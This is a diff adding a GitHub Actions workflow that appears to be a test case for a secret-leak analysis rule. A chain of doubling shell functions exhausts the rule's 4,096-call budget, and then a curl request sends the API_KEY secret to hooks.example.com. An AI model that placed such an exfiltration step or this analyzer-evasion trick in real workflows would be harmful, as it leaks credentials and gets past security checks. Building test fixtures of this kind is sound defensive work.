@@ -1,0 +1,40 @@
+# situation: on push, a step defines a function w that sets key to the
+#   secret API_KEY,
+#   runs a chain of functions f0 to f13 in which each function calls the
+#   function before it twice (16,383 calls), calls w, and sends key to
+#   hooks.example.com with curl.
+# reason: the call of w comes after the 4,096 calls of functions that the
+#   rule follows when it reads what the commands of the step print, so the
+#   rule does not read the body of w for the prints and reports an
+#   Inconclusive at the call of w; the rule still reads the value that w
+#   assigns, and also reports the request that carries the secret.
+# attack: the attacker takes over the server of the destination, by a breach
+#   of the vendor or by registering the domain when the domain lapses.
+# attack-run-behavior: curl sends the secret to hooks.example.com, whose
+#   server, now the attacker's, logs the secret.
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          API_KEY: ${{ secrets.API_KEY }}
+        run: |
+          w() { key="$API_KEY"; }
+          f0() { :; }
+          f1() { f0; f0; }
+          f2() { f1; f1; }
+          f3() { f2; f2; }
+          f4() { f3; f3; }
+          f5() { f4; f4; }
+          f6() { f5; f5; }
+          f7() { f6; f6; }
+          f8() { f7; f7; }
+          f9() { f8; f8; }
+          f10() { f9; f9; }
+          f11() { f10; f10; }
+          f12() { f11; f11; }
+          f13() { f12; f12; }
+          f13
+          w
+          curl -fsS -H "x-apikey: $key" https://hooks.example.com/
